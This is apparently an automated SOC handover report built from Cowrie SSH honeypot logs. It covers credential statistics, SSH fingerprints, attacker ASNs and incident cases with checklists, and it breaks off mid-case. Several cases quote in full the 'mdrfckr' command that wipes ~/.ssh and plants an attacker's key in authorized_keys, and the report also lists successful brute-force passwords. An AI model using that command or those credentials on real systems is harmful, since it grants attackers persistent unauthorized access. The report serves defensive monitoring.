# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-17 |
| **Generated At** | 2026-05-17T06:48:58Z |
| **Shift Time** | 06:48 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **603** |
| Confirmed Threats | **509** |
| False Positives Filtered | **94** (15.6%) |
| Unique Attacker IPs | **33** |
| Countries of Origin | **17** |
| High Severity Cases | **14** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **589** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **32** |
| Unique Credential Pairs | **19** |
| Unique Usernames | **12** |
| Unique Passwords | **19** |
| Successful Auth Pairs | **11** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 14 |
| `345gs5662d34` | 7 |
| `admin` | 2 |
| `irfan` | 1 |
| `trader` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 7 |
| `3245gs5662d34` | 7 |
| `admin` | 2 |
| `3030` | 1 |
| `irfan123` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 7 |
| `root` | `3245gs5662d34` | 7 |
| `admin` | `admin` | 2 |
| `root` | `3030` | 1 |
| `irfan` | `irfan123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `3030` | `45.144.233.56` | 2026-05-17T06:20:19 |
| `root` | `3245gs5662d34` | `45.144.233.56` | 2026-05-17T06:20:23 |
| `root` | `P@ssw0rd2025!` | `27.65.159.108` | 2026-05-17T06:23:08 |
| `root` | `3245gs5662d34` | `27.65.159.108` | 2026-05-17T06:23:11 |
| `root` | `QWEqwe123!` | `211.186.79.173` | 2026-05-17T06:27:04 |
| `root` | `3245gs5662d34` | `211.186.79.173` | 2026-05-17T06:27:08 |
| `root` | `1qaz@WSX` | `211.186.79.173` | 2026-05-17T06:27:52 |
| `root` | `Senha123` | `211.186.79.173` | 2026-05-17T06:28:42 |
| `root` | `20192019` | `107.175.114.16` | 2026-05-17T06:29:17 |
| `root` | `3245gs5662d34` | `107.175.114.16` | 2026-05-17T06:29:23 |
| `root` | `qwe123..` | `211.186.79.173` | 2026-05-17T06:30:24 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **603** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 31 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 18 | 1 |
| `f555226df196...` | Mirai/variant | 13 | 3 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 18 | 1 | libssh-based |
| `f555226df196...` | libssh | 13 | 3 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `211.186.79.173`, `45.144.233.56`, `107.175.114.16`, `27.65.159.108`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **33** |
| Unique ASNs | **32** |
| High-Risk ASNs | **12** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS55836` | Reliance Jio Infocomm Limited | 2 | LOW |
| `AS6327` | Shaw Communications | 1 | LOW |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |
| `AS41745` | Baykov Ilya Sergeevich | 1 | HIGH |
| `AS271875` | MARATEL CA | 1 | LOW |
| `AS7552` | Viettel Group | 1 | HIGH |
| `AS265586` | INBTEL SA DE CV | 1 | LOW |
| `AS3462` | Data Communication Business Group | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (14)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-861226b689a6

| Field | Detail |
|---|---|
| **Source IP** | `45.144.233[.]56` |
| **First Seen** | 2026-05-17 06:20 |
| **Last Seen** | 2026-05-17 06:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 06:20:19` | `cowrie.session.connect` |
| `2026-05-17 06:20:19` | `cowrie.client.version` |
| `2026-05-17 06:20:19` | `cowrie.client.kex` |
| `2026-05-17 06:20:19` | `cowrie.login.success` |
| `2026-05-17 06:20:19` | `cowrie.session.params` |
| `2026-05-17 06:20:19` | `cowrie.command.input` |
| `2026-05-17 06:20:19` | `cowrie.command.failed` |
| `2026-05-17 06:20:20` | `cowrie.log.closed` |
| `2026-05-17 06:20:20` | `cowrie.session.params` |
| `2026-05-17 06:20:20` | `cowrie.command.input` |
| `2026-05-17 06:20:20` | `cowrie.session.file_download` |
| `2026-05-17 06:20:20` | `cowrie.log.closed` |
| `2026-05-17 06:20:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.144.233[.]56` to AbuseIPDB if not already reported
- [ ] Block `45.144.233[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abe1effda84f

| Field | Detail |
|---|---|
| **Source IP** | `45.144.233[.]56` |
| **First Seen** | 2026-05-17 06:20 |
| **Last Seen** | 2026-05-17 06:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 06:20:22` | `cowrie.session.connect` |
| `2026-05-17 06:20:22` | `cowrie.client.version` |
| `2026-05-17 06:20:22` | `cowrie.client.kex` |
| `2026-05-17 06:20:23` | `cowrie.login.success` |
| `2026-05-17 06:20:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.144.233[.]56` to AbuseIPDB if not already reported
- [ ] Block `45.144.233[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d08cf17d96c9

| Field | Detail |
|---|---|
| **Source IP** | `27.65.159[.]108` |
| **First Seen** | 2026-05-17 06:23 |
| **Last Seen** | 2026-05-17 06:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 06:23:07` | `cowrie.session.connect` |
| `2026-05-17 06:23:07` | `cowrie.client.version` |
| `2026-05-17 06:23:07` | `cowrie.client.kex` |
| `2026-05-17 06:23:08` | `cowrie.login.success` |
| `2026-05-17 06:23:08` | `cowrie.session.params` |
| `2026-05-17 06:23:08` | `cowrie.command.input` |
| `2026-05-17 06:23:08` | `cowrie.command.failed` |
| `2026-05-17 06:23:08` | `cowrie.log.closed` |
| `2026-05-17 06:23:08` | `cowrie.session.params` |
| `2026-05-17 06:23:08` | `cowrie.command.input` |
| `2026-05-17 06:23:09` | `cowrie.session.file_download` |
| `2026-05-17 06:23:09` | `cowrie.log.closed` |
| `2026-05-17 06:23:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.65.159[.]108` to AbuseIPDB if not already reported
- [ ] Block `27.65.159[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fda2ed24561

| Field | Detail |
|---|---|
| **Source IP** | `27.65.159[.]108` |
| **First Seen** | 2026-05-17 06:23 |
| **Last Seen** | 2026-05-17 06:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 06:23:10` | `cowrie.session.connect` |
| `2026-05-17 06:23:10` | `cowrie.client.version` |
| `2026-05-17 06:23:10` | `cowrie.client.kex` |
| `2026-05-17 06:23:11` | `cowrie.login.success` |
| `2026-05-17 06:23:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.65.159[.]108` to AbuseIPDB if not already reported
- [ ] Block `27.65.159[.]108` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c58726d38849

| Field | Detail |
|---|---|
| **Source IP** | `211.186.79[.]173` |
| **First Seen** | 2026-05-17 06:27 |
| **Last Seen** | 2026-05-17 06:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 06:27:04` | `cowrie.session.connect` |
| `2026-05-17 06:27:04` | `cowrie.client.version` |
| `2026-05-17 06:27:04` | `cowrie.client.kex` |
| `2026-05-17 06:27:04` | `cowrie.login.success` |
| `2026-05-17 06:27:05` | `cowrie.session.params` |
| `2026-05-17 06:27:05` | `cowrie.command.input` |
| `2026-05-17 06:27:05` | `cowrie.command.failed` |
| `2026-05-17 06:27:05` | `cowrie.log.closed` |
| `2026-05-17 06:27:05` | `cowrie.session.params` |
| `2026-05-17 06:27:05` | `cowrie.command.input` |
| `2026-05-17 06:27:05` | `cowrie.session.file_download` |
| `2026-05-17 06:27:05` | `cowrie.log.closed` |
| `2026-05-17 06:27:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.186.79[.]173` to AbuseIPDB if not already reported
- [ ] Block `211.186.79[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b726cbe120a

| Field | Detail |
|---|---|
| **Source IP** | `211.186.79[.]173` |
| **First Seen** | 2026-05-17 06:27 |
| **Last Seen** | 2026-05-17 06:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 06:27:07` | `cowrie.session.connect` |
| `2026-05-17 06:27:07` | `cowrie.client.version` |
| `2026-05-17 06:27:08` | `cowrie.client.kex` |
| `2026-05-17 06:27:08` | `cowrie.login.success` |
| `2026-05-17 06:27:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.186.79[.]173` to AbuseIPDB if not already reported
- [ ] Block `211.186.79[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eadf5e24ad48

| Field | Detail |
|---|---|
| **Source IP** | `211.186.79[.]173` |
| **First Seen** | 2026-05-17 06:27 |
| **Last Seen** | 2026-05-17 06:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 06:27:52` | `cowrie.session.connect` |
| `2026-05-17 06:27:52` | `cowrie.client.version` |
| `2026-05-17 06:27:52` | `cowrie.client.kex` |
| `2026-05-17 06:27:52` | `cowrie.login.success` |
| `2026-05-17 06:27:53` | `cowrie.session.params` |
| `2026-05-17 06:27:53` | `cowrie.command.input` |
| `2026-05-17 06:27:53` | `cowrie.command.failed` |
| `2026-05-17 06:27:53` | `cowrie.log.closed` |
| `2026-05-17 06:27:53` | `cowrie.session.params` |
| `2026-05-17 06:27:53` | `cowrie.command.input` |
| `2026-05-17 06:27:53` | `cowrie.session.file_download` |
| `2026-05-17 06:27:53` | `cowrie.log.closed` |
| `2026-05-17 06:27:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.186.79[.]173` to AbuseIPDB if not already reported
- [ ] Block `211.186.79[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfc4235a59af

| Field | Detail |
|---|---|
| **Source IP** | `211.186.79[.]173` |
| **First Seen** | 2026-05-17 06:27 |
| **Last Seen** | 2026-05-17 06:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 06:27:55` | `cowrie.session.connect` |
| `2026-05-17 06:27:55` | `cowrie.client.version` |
| `2026-05-17 06:27:56` | `cowrie.client.kex` |
| `2026-05-17 06:27:56` | `cowrie.login.success` |
| `2026-05-17 06:27:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.186.79[.]173` to AbuseIPDB if not already reported
- [ ] Block `211.186.79[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f59642dea8d9

| Field | Detail |
|---|---|
| **Source IP** | `211.186.79[.]173` |
| **First Seen** | 2026-05-17 06:28 |
| **Last Seen** | 2026-05-17 06:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 06:28:42` | `cowrie.session.connect` |
| `2026-05-17 06:28:42` | `cowrie.client.version` |
| `2026-05-17 06:28:42` | `cowrie.client.kex` |
| `2026-05-17 06:28:42` | `cowrie.login.success` |
| `2026-05-17 06:28:43` | `cowrie.session.params` |
| `2026-05-17 06:28:43` | `cowrie.command.input` |
| `2026-05-17 06:28:43` | `cowrie.command.failed` |
| `2026-05-17 06:28:43` | `cowrie.log.closed` |
| `2026-05-17 06:28:43` | `cowrie.session.params` |
| `2026-05-17 06:28:43` | `cowrie.command.input` |
| `2026-05-17 06:28:43` | `cowrie.session.file_download` |
| `2026-05-17 06:28:43` | `cowrie.log.closed` |
| `2026-05-17 06:28:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.186.79[.]173` to AbuseIPDB if not already reported
- [ ] Block `211.186.79[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-619c32bee596

| Field | Detail |
|---|---|
| **Source IP** | `211.186.79[.]173` |
| **First Seen** | 2026-05-17 06:28 |
| **Last Seen** | 2026-05-17 06:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 06:28:45` | `cowrie.session.connect` |
| `2026-05-17 06:28:45` | `cowrie.client.version` |
| `2026-05-17 06:28:45` | `cowrie.client.kex` |
| `2026-05-17 06:28:46` | `cowrie.login.success` |
| `2026-05-17 06:28:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.186.79[.]173` to AbuseIPDB if not already reported
- [ ] Block `211.186.79[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1090c7c8555c

| Field | Detail |
|---|---|
| **Source IP** | `107.175.114[.]16` |
| **First Seen** | 2026-05-17 06:29 |
| **Last Seen** | 2026-05-17 06:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 06:29:15` | `cowrie.session.connect` |
| `2026-05-17 06:29:15` | `cowrie.client.version` |
| `2026-05-17 06:29:16` | `cowrie.client.kex` |
| `2026-05-17 06:29:17` | `cowrie.login.success` |
| `2026-05-17 06:29:17` | `cowrie.session.params` |
| `2026-05-17 06:29:17` | `cowrie.command.input` |
| `2026-05-17 06:29:17` | `cowrie.command.failed` |
| `2026-05-17 06:29:18` | `cowrie.log.closed` |
| `2026-05-17 06:29:18` | `cowrie.session.params` |
| `2026-05-17 06:29:18` | `cowrie.command.input` |
| `2026-05-17 06:29:19` | `cowrie.session.file_download` |
| `2026-05-17 06:29:19` | `cowrie.log.closed` |
| `2026-05-17 06:29:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.175.114[.]16` to AbuseIPDB if not already reported
- [ ] Block `107.175.114[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a025311811f1

| Field | Detail |
|---|---|
| **Source IP** | `107.175.114[.]16` |
| **First Seen** | 2026-05-17 06:29 |
| **Last Seen** | 2026-05-17 06:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 06:29:22` | `cowrie.session.connect` |
| `2026-05-17 06:29:22` | `cowrie.client.version` |
| `2026-05-17 06:29:22` | `cowrie.client.kex` |
| `2026-05-17 06:29:23` | `cowrie.login.success` |
| `2026-05-17 06:29:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.175.114[.]16` to AbuseIPDB if not already reported
- [ ] Block `107.175.114[.]16` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32578a1b6632

| Field | Detail |
|---|---|
| **Source IP** | `211.186.79[.]173` |
| **First Seen** | 2026-05-17 06:30 |
| **Last Seen** | 2026-05-17 06:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 06:30:23` | `cowrie.session.connect` |
| `2026-05-17 06:30:23` | `cowrie.client.version` |
| `2026-05-17 06:30:23` | `cowrie.client.kex` |
| `2026-05-17 06:30:24` | `cowrie.login.success` |
| `2026-05-17 06:30:24` | `cowrie.session.params` |
| `2026-05-17 06:30:24` | `cowrie.command.input` |
| `2026-05-17 06:30:24` | `cowrie.command.failed` |
| `2026-05-17 06:30:24` | `cowrie.log.closed` |
| `2026-05-17 06:30:24` | `cowrie.session.params` |
| `2026-05-17 06:30:24` | `cowrie.command.input` |
| `2026-05-17 06:30:25` | `cowrie.session.file_download` |
| `2026-05-17 06:30:25` | `cowrie.log.closed` |
| `2026-05-17 06:30:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.186.79[.]173` to AbuseIPDB if not already reported
- [ ] Block `211.186.79[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad6eea0fae26

| Field | Detail |
|---|---|
| **Source IP** | `211.186.79[.]173` |
| **First Seen** | 2026-05-17 06:30 |
| **Last Seen** | 2026-05-17 06:30 |
| **Session Duration** | 0s |
